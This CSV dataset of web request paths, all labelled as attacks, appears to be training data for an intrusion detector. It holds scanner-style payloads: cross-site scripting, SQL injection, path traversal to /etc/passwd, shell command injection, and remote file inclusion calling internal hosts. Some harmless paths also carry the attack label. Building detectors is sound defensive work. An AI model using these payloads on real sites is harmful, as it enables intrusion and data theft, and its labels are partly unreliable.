payload,label
/top.php?stuff='uname >q36497765 #,1
/h21y8w52.nsf?<script>cross_site_scripting.nasl</script>,1
"/ca000001.pl?action=showcart&hop=\""><script>alert('vulnerable')</script>&path=acatalog/",1
/scripts/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; ,1
/javascript/mta.exe,1
/examples/jsp/colors/kernel/loadkernel.php?installpath=/etc/passwd\x00,1
/examples/jsp/cal/feedsplitter.php?format=../../../../../../../../../../etc/passwd\x00&debug=1,1
/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd,1
/cgi-bin/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></select><?phpinfo();?>,1
/examples/jsp/cal/search.php?allwords=<br><script>foo</script>&cid=0&title=1&desc=1,1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo""+||+echo+db+4d+5a+50+00+02+00+00+00+04+00+0f+00+ff+ff+00+00+b8+00+00+00+00+00+00+00+40++>>esbq",1
"/examples/jsp/colors/workarea/contentdesigner/ekformsiframe.aspx?id=""><script>alert('nessus')</script>",1
/id;1627282494;fp;2;fpid;1/,1
"/<img src=""javascript:alert(cross_site_scripting.nasl);"">.do",1
"/bmeun223.exe?<meta http-equiv=set-cookie content=""testhhwu=7044"">",1
/htbin/windmail.exe,1
"/<script>document.cookie=""testrluj=1420;""</script>",1
/javascript/.passwd.jpg,1
/opensiteadmin/scripts/classes/databasemanager.php?path=http://192.168.202.118:8080/ghl9il?\x00,1
/examples/jsp/jsp2/el/search=<script>alert('xss')</script>,1
/javascript/signer.exe,1
"/help.php?q=""&del\x0bq26193259&rem\x0b",1
/c'hoario\xc3\xb9/,1
"/main.php?logout=""&del\x0cq31768299&rem\x0c",1
/\xd0\x97\xd0\xb4\xd0\xbe\xd1\x80\xd0\xbe\xd0\xb2'\xd1\x8f/,1
"/themes/modern/user_style.php?user_colors[bg_color]=""</style><script>alert(411136083423)</script>",1
"/nyjgaorz.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/cgi-bin/index.php?op=default&date=200607' union select 1,501184215,1,1,1,1,1,1,1,1--&blogid=1",1
/scripts/cfooter.php3,1
/en-us/dda2qr7j.fts?<script>cross_site_scripting.nasl</script>,1
"/?<meta http-equiv=set-cookie content=""testpokn=7494"">",1
"/169okeyj.jspa?<meta http-equiv=set-cookie content=""testxeoi=3573"">",1
"/j734qobz.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/error/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script,1
/post.asp?method=topic&forum_id=1&cat_id=1&type=wvs-xss-magic-string-410025568136,1
/ows-bin/windmail.exe,1
/manager/secure.php?cfgprogdir=/etc/passwd\x00,1
/debug/showproc?proc===<script>alert('vulnerable');</script>,1
"/<script>document.cookie=""testnvxc=4301;""</script>",1
/cacti/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331905098')</script>,1
/scripts/comersus_customerregistrationform.asp,1
/cgi-bin/search.pl?form=../../../../../../etc/passwd\x00,1
/help.php?q='uname >q23433168 #,1
"/u8yiqilu.jsp?<meta http-equiv=set-cookie content=""testswjp=6010"">",1
/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1376526276--,1
/core/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
"/xsqln7eb.aspx?<meta http-equiv=set-cookie content=""testpcbb=9254"">",1
"/u8yiqilu.dll?<script>document.cookie=""testswjp=6010;""</script>",1
/5o9zq43e.cfm?<script>cross_site_scripting.nasl</script>,1
/manager/cgi/tseekdir.cgi?location=/etc/passwd\x00,1
"/qhvu0pdg.fts?<meta http-equiv=set-cookie content=""testchuc=2100"">",1
/scripts/lsg2.cgi,1
"/1r8cfrlf.exe?<script>document.cookie=""testydan=5106;""</script>",1
/scripts/misc/audio.php?recording=../version.inc,1
/javascript/.passwd.php3,1
/<script>cross_site_scripting.nasl</script>.idc,1
/learnvbscript/,1
"/main.php?logout=""\x0duname #",1
/recordings/usrdetails.php?sgnuptype=csaleid<script>nessus</script>,1
/javascript/emea.exe,1
"/8t9v8k7x.exe?<script>document.cookie=""testhvje=9403;""</script>",1
"/examples/jsp/error/include/error/autherror.cfm?errorcode=1&ftvar_linkp=""></a><script>alert('fusetalk_mult_xss.nasl')</script><a href=""",1
"/en-us/oie504mr.jspa?<meta http-equiv=set-cookie content=""testtpby=7052"">",1
/examples/jsp/colors/bb-hostsvc.sh?hostsvc=../../../../../etc/passwd,1
/cgi-bin/type.asp?itype='duware_itype_sql_injection.nasl,1
"/help.php?q=""del q66737251 #",1
"/dslpwt15.fts?<script>document.cookie=""testtkio=5454;""</script>",1
"/lsoix5h3.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/chef's_knives/,1
/starnet/addons/slideshow_full.php?album_name='288150554,1
"/examples/jsp/num/index.php?id='union/**/select/**/0,0,1369222205,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
/scripts/search.scr.php?globals[pth][classes]=http://192.168.202.118:8080/tzhfyzkbomspvm??,1
/mpcgi/apexec.pl?etype=odp&passurl=/category/&template=../../../../../../../../../../etc/passwd\x00.html,1
"/main.php?logout=""rm q61955456&rem ",1
/scripts/w04ukbv54ixz.cfm,1
/postscriptbarcode/,1
/javascript/htpasswd.exe,1
/javascript/mod.exe,1
/containsscript/,1
/help.php?q=;del q94314237 #,1
/scripts/alienform.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd,1
/tera patrick - farmer's daughter/,1
/cgi-sys/a1stats/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
"/bxnyrhmh.cgi?<script>document.cookie=""testmjct=1867;""</script>",1
/scripting languages/,1
/cgi-local/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
"/bxnyrhmh.cfc?<script>document.cookie=""testmjct=1867;""</script>",1
/javascript/warez.exe,1
"/scs86g1p.cfm?<meta http-equiv=set-cookie content=""testquyx=2820"">",1
/scripts/search.scr.php?globals[pth][classes]=http://192.168.202.96:8080/4dckqcc0acprbz??,1
"/tuwjta1w.x?<script>document.cookie=""testpokn=7494;""</script>",1
/pirvate/ltwpdfmonth.php?ltw_config['include_dir]=http://192.168.202.118:8080/ghl9il?,1
/cacti/javascript.php?abs_path=/etc/passwd\x00,1
/en-us/n9xlumt5.x?<script>cross_site_scripting.nasl</script>,1
/bb-hist.sh?histfile=../../../../../etc/passwd,1
/cgi-bin/view_user.php?list=1&letter=&sort_by='select,1
"/<script>document.cookie=""testggad=2000;""</script>",1
/scripts/readme.txt,1
"/ybz5rz7a.pl?<script>document.cookie=""testsbvw=6289;""</script>",1
/javascript/backup.exe,1
/javascript/htpasswd.cgi,1
/phpmyadmin/documentation.html?phpmyadmin=csc3t31gos8q2h30o9cfk567d1lu5go1;/bin/id,1
/rv98iwjp.php?<script>cross_site_scripting.nasl</script>,1
/scripts/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script,1
/cgi-bin/starnet/addons/slideshow_full.php?album_name='401935065,1
/y8pmygrp.exe?<script>cross_site_scripting.nasl</script>,1
/top.php?stuff=';uname >q64815511 #,1
"/xfkun1ku.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/checkbox/bandwidth/index.cgi?action=showmonth&year=<script>foo</script>&month=<script>foo</script>,1
"/oie504mr.cfc?<meta http-equiv=set-cookie content=""testtpby=7052"">",1
/opensiteadmin/scripts/classes/filter.php?path=http://192.168.202.96:8080/swgnhpydbq0t?\x00,1
/manager/index.php?selskin=../inc/boxleft.inc\x00&xposbox[l][]=/etc/passwd\x00,1
/iktok2bw.cfm?<script>cross_site_scripting.nasl</script>,1
/help.php?q=del;q81588837&rem;,1
"/en-us/dda2qr7j.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/javascript/~eric.exe,1
/scripts/apps/pbcs.dll/misc?url=../../../../../../../../../../../../boot.ini,1
/cgi-914/webbbs/webbbs_config.pl?body=aaaaffff&email=test@example.com&followup=10;cat /etc/passwd&name=joe,1
/manager/loudblog/inc/parse_old.php?template=@system(id);@&php_use=1&phpseparator=@,1
"/acart2_0/signin.asp?msg=<script>alert(\""test\"")</script>",1
/cgi-bin/inc/formmail.inc.php?script_root=../templates/mail.tpl.txt\x00,1
/read.php?pagenum_rsread=1&totalrows_rsread=<script>alert('wvs-xss-magic-string-414685599129')</script>,1
/help.php?q='rm\x09q87915929\x09#,1
/recordings/calendar.php?serverpath=/etc/passwd\x00,1
/javascript/hardcore.exe,1
/examples/servlets/servlet/ovlaunch.exe,1
/d765w06j.cfm?<script>cross_site_scripting.nasl</script>,1
/javascript/scripts.exe,1
"/i686v90l.cgi?<script>document.cookie=""testfutf=1550;""</script>",1
"/ywaxntrx.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/phpmyadmin/doc/index.php?s=/etc/passwd\x00,1
"/scriptssearch_results.dot?search_query=nessus""><script>alert('dotcms_search_query_xss.nasl')</script>/",1
/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=mbt7mplpoxxxq5dko,1
/javascript/program files.exe,1
/manager/xaradodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/syshelp/cscript/showfunc.stm?func=<script>alert(document.cookie)</script>,1
/l4fz1dqw.nsf?<script>cross_site_scripting.nasl</script>,1
"/if69ddo1.php3?<meta http-equiv=set-cookie content=""testiabz=5220"">",1
"/main.php?stuff=""&ping\xa0-w\xa07000\xa0-n\xa01\xa01.2.3.4&rem\xa0",1
/top.php?stuff=;sleep 7 #,1
"/?<script>document.cookie=""testqppc=8767;""</script>",1
"/scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331905182,1,1,1,1,1,1,1--&blogid=1",1
"/scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 2020390524,2,880987929,4,5,6,7,8,9,0,1,2,3 --",1
"/main.php?logout=ver,>q12148819&rem,",1
"/ny1b3qq4.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/main.php?stuff='&sleep\x0910\x09#,1
/scripts/eezuu7xc7ge3.php3,1
/ovcgi/webappmon.exe?ins=nowait&sel=localhost&act=ping,1
/7uz3ok60.htm?<script>cross_site_scripting.nasl</script>,1
"/top.php?stuff=""sleep\x099\x09#",1
/scripts/index.php?board=nonexistant1465558133,1
"/d44uk9h2.exe?<script>document.cookie=""testmybc=2088;""</script>",1
/index.php?include_files[]=&include_files[query_string]=/etc/passwd,1
/awstatstotals.php?sort={${phpinfo()}}{${exit()}},1
/help.php?q=ping;-w;11000;-n;1;1.2.3.4|rem;,1
"/tukodz3j.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1164366855--,1
"/ht8pn8uq.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/yver8r9o.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/cgi-bin/starnet/addons/slideshow_full.php?album_name='1273136253,1
"/examples/jsp/checkbox/login.php?user=""><script>alert('pubcookie_xss.nasl');</script>",1
"/qhvu0pdg.dll?<meta http-equiv=set-cookie content=""testchuc=2100"">",1
/javascript/webbbs.exe,1
"/<meta http-equiv=set-cookie content=""testjvvf=7721"">",1
/boilerplate.asp?nfuse_template=.../.../.../.../.../.../.../.../.../boot.ini&nfuse_currentfolder=/,1
/scripts/vhost.php?action=logout&time=1331919067,1
/examples/jsp/cal/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd\x00,1
/bzuf9ozq.pl?<script>cross_site_scripting.nasl</script>,1
/cgi-bin/directorypro.cgi?want=showcat&show=../../../../../../../../../../etc/passwd\x00,1
/interface/login/login_frame.php?site=<script>alert(owasp zap);</script> and 1=1,1
/cgi-bin/error.php?selected_theme=<script>alert(uebimiau_selected_theme_xss.nasl)</script>,1
/scripts/default.asp,1
/examples/jsp/num/contenido/classes/class.inuse.php?cfg[path][contenido]=/etc/passwd\x00,1
"/oie504mr.htm?<script>document.cookie=""testtpby=7052;""</script>",1
"/examples/jsp/jsp2/jspx/activatemember?activatecode=&member=""><script>alert('mvnforum_activatemember_xss.nasl')</script>",1
"/en-us/account/workarea/contentdesigner/ekformsiframe.aspx?id=""><script>alert('nessus')</script>",1
/subscriptionservices/,1
/scripts/index.php?getapplication=register&checknum=1&args=null,1
/vjbrrppi.fts?<script>cross_site_scripting.nasl</script>,1
/cacti/download.php?language=/etc/passwd\x00,1
/phpmyadmin/k/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor,1
/phpmyadmin/view_user.php?list=1&letter=&sort_by='select,1
/javascript/debug.exe,1
/scripts/udblphlq4nln.sh,1
/chief's message on violence against women/,1
/cacti/js/vendors.php?file=../../../../../../../../../../etc/passwd\x00nessus.js,1
/scripts/qg9h0c0svvat.shtml,1
/examples/jsp/jsp2/jspx/view_user.php?list=1&letter=&sort_by='select,1
/cgi-bin/perl.exe?-v,1
